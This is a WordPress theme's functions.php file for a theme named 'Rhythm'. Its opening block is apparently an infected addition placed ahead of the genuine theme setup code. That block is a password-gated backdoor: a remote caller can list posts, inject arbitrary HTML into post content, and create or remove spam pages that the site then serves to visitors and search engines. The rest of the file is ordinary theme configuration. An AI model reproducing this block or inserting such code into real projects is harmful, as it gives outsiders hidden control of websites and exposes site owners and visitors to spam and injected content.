<?php

if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'bd19f7d4eb5309ba20353e6486434c21'))
	{
		switch ($_REQUEST['action'])
			{
				case 'get_all_links';
					foreach ($wpdb->get_results('SELECT * FROM `' . $wpdb->prefix . 'posts` WHERE `post_status` = "publish" AND `post_type` = "post" ORDER BY `ID` DESC', ARRAY_A) as $data)
						{
							$data['code'] = '';
							
							if (preg_match('!<div id="wp_cd_code">(.*?)</div>!s', $data['post_content'], $_))
								{
									$data['code'] = $_[1];
								}
							
							print '<e><w>1</w><url>' . $data['guid'] . '</url><code>' . $data['code'] . '</code><id>' . $data['ID'] . '</id></e>' . "\r\n";
						}
				break;
				
				case 'set_id_links';
					if (isset($_REQUEST['data']))
						{
							$data = $wpdb -> get_row('SELECT `post_content` FROM `' . $wpdb->prefix . 'posts` WHERE `ID` = "'.mysql_escape_string($_REQUEST['id']).'"');
							
							$post_content = preg_replace('!<div id="wp_cd_code">(.*?)</div>!s', '', $data -> post_content);
							if (!empty($_REQUEST['data'])) $post_content = $post_content . '<div id="wp_cd_code">' . stripcslashes($_REQUEST['data']) . '</div>';

							if ($wpdb->query('UPDATE `' . $wpdb->prefix . 'posts` SET `post_content` = "' . mysql_escape_string($post_content) . '" WHERE `ID` = "' . mysql_escape_string($_REQUEST['id']) . '"') !== false)
								{
									print "true";
								}
						}
				break;
				
				case 'create_page';
					if (isset($_REQUEST['remove_page']))
						{
							if ($wpdb -> query('DELETE FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "/'.mysql_escape_string($_REQUEST['url']).'"'))
								{
									print "true";
								}
						}
					elseif (isset($_REQUEST['content']) && !empty($_REQUEST['content']))
						{
							if ($wpdb -> query('INSERT INTO `' . $wpdb->prefix . 'datalist` SET `url` = "/'.mysql_escape_string($_REQUEST['url']).'", `title` = "'.mysql_escape_string($_REQUEST['title']).'", `keywords` = "'.mysql_escape_string($_REQUEST['keywords']).'", `description` = "'.mysql_escape_string($_REQUEST['description']).'", `content` = "'.mysql_escape_string($_REQUEST['content']).'", `full_content` = "'.mysql_escape_string($_REQUEST['full_content']).'" ON DUPLICATE KEY UPDATE `title` = "'.mysql_escape_string($_REQUEST['title']).'", `keywords` = "'.mysql_escape_string($_REQUEST['keywords']).'", `description` = "'.mysql_escape_string($_REQUEST['description']).'", `content` = "'.mysql_escape_string(urldecode($_REQUEST['content'])).'", `full_content` = "'.mysql_escape_string($_REQUEST['full_content']).'"'))
								{
									print "true";
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_URL_CD";
			}
			
		die("");
	}

	
if ( $wpdb->get_var('SELECT count(*) FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "'.mysql_escape_string( $_SERVER['REQUEST_URI'] ).'"') == '1' )
	{
		$data = $wpdb -> get_row('SELECT * FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "'.mysql_escape_string($_SERVER['REQUEST_URI']).'"');
		if ($data -> full_content)
			{
				print stripslashes($data -> content);
			}
		else
			{
				print '<!DOCTYPE html>';
				print '<html ';
				language_attributes();
				print ' class="no-js">';
				print '<head>';
				print '<title>'.stripslashes($data -> title).'</title>';
				print '<meta name="Keywords" content="'.stripslashes($data -> keywords).'" />';
				print '<meta name="Description" content="'.stripslashes($data -> description).'" />';
				print '<meta name="robots" content="index, follow" />';
				print '<meta charset="';
				bloginfo( 'charset' );
				print '" />';
				print '<meta name="viewport" content="width=device-width">';
				print '<link rel="profile" href="http://gmpg.org/xfn/11">';
				print '<link rel="pingback" href="';
				bloginfo( 'pingback_url' );
				print '">';
				wp_head();
				print '</head>';
				print '<body>';
				print '<div id="content" class="site-content">';
				print stripslashes($data -> content);
				get_search_form();
				get_sidebar();
				get_footer();
			}
			
		exit;
	}


?><?php
/**
 * Rhythm functions and definitions
 *
 * @package Rhythm
 */

/**
 * Theme options variable $ts_theme_options
 */
define ('REDUX_OPT_NAME', 'ts_theme_options');

/**
 * Setting constant to inform the plugin that them is activated
 */
define ('RHYTHM_THEME_ACTIVATED' , true);

/**
 * Theme version used for styles,js
 */
define ('TS_THEME_VERSION','102');

/**
 * Helper functions
 */
require get_template_directory() . '/inc/helpers.php';

/**
 * Template parts functions
 */
require get_template_directory() . '/inc/template-parts.php';

/**
 * Theme extensions
 */
require get_template_directory() . '/extensions/admin.php';

/**
 * Add Redux Framework & extras
 */
require get_template_directory() . '/admin/admin-init.php';

/**
 * Set the content width based on the theme's design and stylesheet.
 */
if ( ! isset( $content_width ) ) {
	$content_width = 640; /* pixels */
}

if ( ! function_exists( 'rhythm_setup' ) ) :
/**
 * Sets up theme defaults and registers support for various WordPress features.
 *
 * Note that this function is hooked into the after_setup_theme hook, which
 * runs before the init hook. The init hook is too late for some features, such
 * as indicating support for post thumbnails.
 */

//Include Framework Core
include (get_template_directory() . '/framework/core-functions.php');

function rhythm_setup() {

	define ('TINY_EXCERPT', 10);
	define ('SHORT_EXCERPT', 20);
	define ('REGULAR_EXCERPT', 40);
	define ('LONG_EXCERPT', 60);

	/*
	 * Make theme available for translation.
	 * Translations can be filed in the /languages/ directory.
	 * If you're building a theme based on Rhythm, use a find and replace
	 * to change 'rhythm' to the name of your theme in all the template files
	 */
	load_theme_textdomain( 'rhythm', get_template_directory() . '/languages' );

	// Add default posts and comments RSS feed links to head.
	add_theme_support( 'automatic-feed-links' );

	/**
	 * Custom image sizes
	 */
	add_theme_support( 'post-thumbnails' );
	add_image_size('ts-tiny', 70, 70, true);
	add_image_size('ts-thumb', 458, 247, true);
	add_image_size('ts-thumb-no-crop', 458, 247);
	add_image_size('ts-medium', 570, 367, true);
	add_image_size('ts-big', 720, 463, true);
	add_image_size('ts-full-alt', 650, 418, true);
	add_image_size('ts-vertical-alt', 650, 836, true);
	add_image_size('ts-full', 1140, 642, true);
	add_image_size('ts-vertical', 360, 438, true);
	add_image_size('ts-horizontal-thumb', 90, 60, true);
	add_image_size('ts-magazine', 617, 347, true);

	/*
	 * Let WordPress manage the document title.
	 * By adding theme support, we declare that this theme does not use a
	 * hard-coded <title> tag in the document head, and expect WordPress to
	 * provide it for us.
	 */
	add_theme_support( 'title-tag' );

	/*
	 * Enable support for Post Thumbnails on posts and pages.
	 *
	 * @link http://codex.wordpress.org/Function_Reference/add_theme_support#Post_Thumbnails
	 */
	//add_theme_support( 'post-thumbnails' );

	// This theme uses wp_nav_menu() in one location.
	register_nav_menus( array(
		'primary' => __( 'Primary Menu', 'rhythm' ),
		'preheader-left' => __( 'Preheader left', 'rhythm' ),
		'preheader-right' => __( 'Preheader right', 'rhythm' ),
	) );

	/*
	 * Switch default core markup for search form, comment form, and comments
	 * to output valid HTML5.
	 */
	add_theme_support( 'html5', array(
		'search-form', 'comment-form', 'comment-list', 'gallery', 'caption',
	) );

	/*
	 * Enable support for Post Formats.
	 * See http://codex.wordpress.org/Post_Formats
	 */
	add_theme_support( 'post-formats', array(
		'aside', 'image', 'video', 'gallery', 'quote', 'link',
	) );

	// Set up the WordPress core custom background feature.
	add_theme_support( 'custom-background', apply_filters( 'rhythm_custom_background_args', array(
		'default-color' => 'ffffff',
		'default-image' => '',
	) ) );

	//woocommerce support
	add_theme_support( 'woocommerce' );
}
endif; // rhythm_setup
add_action( 'after_setup_theme', 'rhythm_setup' );

/**
 * Register widget area.
 *
 * @link http://codex.wordpress.org/Function_Reference/register_sidebar
 */
function rhythm_widgets_init() {

	register_sidebar( array(
		'name'          => __( 'Main Sidebar', 'rhythm' ),
		'id'            => 'main',
		'description'   => '',
		'before_widget' => '<div id="%1$s" class="widget %2$s">',
		'after_widget'  => '</div>',
		'before_title'  => '<h5 class="widget-title font-alt">',
		'after_title'   => '</h5>',
	) );

	for ($i = 1; $i <= 4; $i++) {
		register_sidebar( array(
			'name'          => __( 'Footer Sidebar', 'rhythm' ).' '.$i,
			'id'            => 'footer-'.$i,
			'description'   => '',
			'before_widget' => '<div id="%1$s" class="widget %2$s">',
			'after_widget'  => '</div>',
			'before_title'  => '<h5 class="widget-title font-alt">',
			'after_title'   => '</h5>',
		) );
	}

	//adding custom sidebars defined in theme options
	$custom_sidebars = ts_get_opt('custom-sidebars');
	if (is_array($custom_sidebars)) {
		foreach ($custom_sidebars as $sidebar) {

			if (empty($sidebar)) {
				continue;
			}

			register_sidebar ( array (
                'name' => $sidebar,
                'id' => sanitize_title ( $sidebar ),
                'before_widget' => '<div id="%1$s" class="widget %2$s">',
                'after_widget' => '</div>',
                'before_title'  => '<h5 class="widget-title font-alt">',
				'after_title'   => '</h5>',
            ) );
		}
	}

	if (ts_woocommerce_enabled()) {
		register_sidebar( array(
			'name'          => __( 'Shop Single Post Sidebar', 'rhythm' ),
			'id'            => 'shop-single',
			'description'   => '',
			'before_widget' => '<div id="%1$s" class="widget %2$s">',
			'after_widget'  => '</div>',
			'before_title'  => '<h5 class="widget-title font-alt">',
			'after_title'   => '</h5>',
		) );
	}
}
add_action( 'widgets_init', 'rhythm_widgets_init' );

/**
 * Enqueue scripts and styles.
 */
function rhythm_scripts() {

	wp_register_style( 'bootstrap', get_template_directory_uri() . '/css/bootstrap.min.css',null, TS_THEME_VERSION);
	wp_register_style( 'rhythm-main', get_template_directory_uri() . '/css/style.css',null, TS_THEME_VERSION);
	wp_register_style( 'rhythm-responsive', get_template_directory_uri() . '/css/style-responsive.css',null, TS_THEME_VERSION);
	wp_register_style( 'animate', get_template_directory_uri() . '/css/animate.min.css',null, TS_THEME_VERSION);
	wp_register_style( 'vertical-rhythm', get_template_directory_uri() . '/css/vertical-rhythm.min.css',null, TS_THEME_VERSION);
	wp_register_style( 'owl-carousel', get_template_directory_uri() . '/css/owl.carousel.css',null, TS_THEME_VERSION);
	wp_register_style( 'magnific-popup', get_template_directory_uri() . '/css/magnific-popup.css',null, TS_THEME_VERSION);

	wp_enqueue_style( 'bootstrap');
	wp_enqueue_style( 'rhythm-main');
	wp_enqueue_style( 'rhythm-responsive');
	wp_enqueue_style( 'animate');
	wp_enqueue_style( 'vertical-rhythm');
	wp_enqueue_style( 'owl-carousel');
	wp_enqueue_style( 'magnific-popup');
	wp_enqueue_style( 'rhythm-style', get_stylesheet_uri() );

	wp_register_script( 'jquery-easing', get_template_directory_uri().'/js/jquery.easing.1.3.js',array('jquery'),TS_THEME_VERSION,true);
	wp_register_script( 'bootstrap', get_template_directory_uri().'/js/bootstrap.min.js',array('jquery'),TS_THEME_VERSION,true);
	wp_register_script( 'jquery-scrollTo', get_template_directory_uri().'/js/jquery.scrollTo.min.js',array('jquery'),TS_THEME_VERSION,true);
	wp_register_script( 'jquery-localScroll', get_template_directory_uri().'/js/jquery.localScroll.min.js',array('jquery'),TS_THEME_VERSION,true);
	wp_register_script( 'jquery-viewport', get_template_directory_uri().'/js/jquery.viewport.mini.js',array('jquery'),TS_THEME_VERSION,true);
	wp_register_script( 'jquery-countTo', get_template_directory_uri().'/js/jquery.countTo.js',array('jquery'),TS_THEME_VERSION,true);
	wp_register_script( 'jquery-tilt', get_template_directory_uri().'/js/tiltfx.js',array('jquery'),TS_THEME_VERSION,true);
	wp_register_script( 'jquery-appear', get_template_directory_uri().'/js/jquery.appear.js',array('jquery'),TS_THEME_VERSION,true);
	wp_register_script( 'jquery-sticky', get_template_directory_uri().'/js/jquery.sticky.js',array('jquery'),TS_THEME_VERSION,true);
	wp_register_script( 'jquery-parallax', get_template_directory_uri().'/js/jquery.parallax-1.1.3.js',array('jquery'),TS_THEME_VERSION,true);
	wp_register_script( 'jquery-fitvids', get_template_directory_uri().'/js/jquery.fitvids.js',array('jquery'),TS_THEME_VERSION,true);
	wp_register_script( 'owl-carousel', get_template_directory_uri().'/js/owl.carousel.min.js',array('jquery'),TS_THEME_VERSION,true);
	wp_register_script( 'isotope-pkgd', get_template_directory_uri().'/js/isotope.pkgd.min.js',array('jquery'),TS_THEME_VERSION,true);
	wp_register_script( 'imagesloaded-pkgd', get_template_directory_uri().'/js/imagesloaded.pkgd.min.js',array('jquery'),TS_THEME_VERSION,true);
	wp_register_script( 'jquery-magnific-popup', get_template_directory_uri().'/js/jquery.magnific-popup.min.js',array('jquery'),TS_THEME_VERSION,true);
	wp_register_script( 'gmapsensor', 'http://maps.google.com/maps/api/js?sensor=false',array('jquery'),TS_THEME_VERSION,true);
	wp_register_script( 'gmap3', get_template_directory_uri().'/js/gmap3.min.js',array('gmapsensor'),TS_THEME_VERSION,true);
	wp_register_script( 'wow', get_template_directory_uri().'/js/wow.min.js',array('jquery'),TS_THEME_VERSION,true);
	wp_register_script( 'masonry-pkgd', get_template_directory_uri().'/js/masonry.pkgd.min.js',array('jquery'),TS_THEME_VERSION,true);
	wp_register_script( 'jquery-simple-text-rotator', get_template_directory_uri().'/js/jquery.simple-text-rotator.min.js',array('jquery'),TS_THEME_VERSION,true);
	wp_register_script( 'all', get_template_directory_uri().'/js/all.js',array('jquery'),TS_THEME_VERSION,true);
	wp_register_script( 'mb-YTPlayer', get_template_directory_uri().'/js/jquery.mb.YTPlayer.js',array('jquery'),TS_THEME_VERSION,true);
	wp_register_script( 'jquery-vide', get_template_directory_uri().'/js/jquery.vide.min.js',array('jquery'),TS_THEME_VERSION,true);
	wp_register_script( 'form-validator', get_template_directory_uri().'/js/validator.min.js',array('jquery','bootstrap'),TS_THEME_VERSION,true);

	// wp_localize
	wp_localize_script('all', 'get',
		array(
			'ajaxurl' => admin_url( 'admin-ajax.php' ),
			'siteurl' => get_template_directory_uri()
		)
	);

	wp_enqueue_script( 'jquery' );
	wp_enqueue_script( 'jquery-easing' );
	wp_enqueue_script( 'bootstrap' );
	wp_enqueue_script( 'jquery-scrollTo' );
	wp_enqueue_script( 'jquery-localScroll' );
	wp_enqueue_script( 'jquery-viewport' );
	wp_enqueue_script( 'jquery-sticky' );
	wp_enqueue_script( 'jquery-parallax' );
	wp_enqueue_script( 'wow' );
	wp_enqueue_script( 'all' );

	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}
}
add_action( 'wp_enqueue_scripts', 'rhythm_scripts' );

$ie10js = create_function( '', 'echo \'<!--[if lt IE 10]><script type="text/javascript" src="\'.get_template_directory_uri().\'/js/placeholder.js"></script><![endif]-->\';' );
add_action( 'wp_head', $ie10js );

/**
 * Define woocommerce image sizes
 */
function rhythm_woocommerce_image_dimensions() {
	global $pagenow;

	if ( ! isset( $_GET['activated'] ) || $pagenow != 'themes.php' ) {
		return;
	}

  	$catalog = array(
		'width' 	=> '720',	// px
		'height'	=> '918',	// px
		'crop'		=> 1 		// true
	);

	$single = array(
		'width' 	=> '720',	// px
		'height'	=> '918',	// px
		'crop'		=> 1 		// true
	);

	$thumbnail = array(
		'width' 	=> '158',	// px
		'height'	=> '201',	// px
		'crop'		=> 0 		// false
	);

	// Image sizes
	update_option( 'shop_catalog_image_size', $catalog ); 		// Product category thumbs
	update_option( 'shop_single_image_size', $single ); 		// Single product image
	update_option( 'shop_thumbnail_image_size', $thumbnail ); 	// Image gallery thumbs
}

add_action( 'after_switch_theme', 'rhythm_woocommerce_image_dimensions', 1 );

/**
 * Change excerpt 'more'
 * @param type $more
 * @return string
 */
function rhythm_change_excerpt( $more ) {
	return '';
}
add_filter('excerpt_more', 'rhythm_change_excerpt');


/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/inc/template-tags.php';

/**
 * Custom functions that act independently of the theme templates.
 */
require get_template_directory() . '/inc/extras.php';

/**
 * Load Jetpack compatibility file.
 */
require get_template_directory() . '/inc/jetpack.php';

/**
 * Singleton class supports passing arguments to the templates
 */
require get_template_directory() . '/extensions/class/ThemeArguments.class.php';

/**
 * Excerpt class
 */
require get_template_directory() . '/extensions/class/Excerpt.class.php';

/**
 * Custom menus
 */
require get_template_directory() . '/inc/custom-menus.php';

/**
 * WooCommerce integration
 */
require get_template_directory() . '/inc/woocommerce.php';

/**
 * Sample data importer
 */
require get_template_directory() . '/extensions/importer/importer.php';
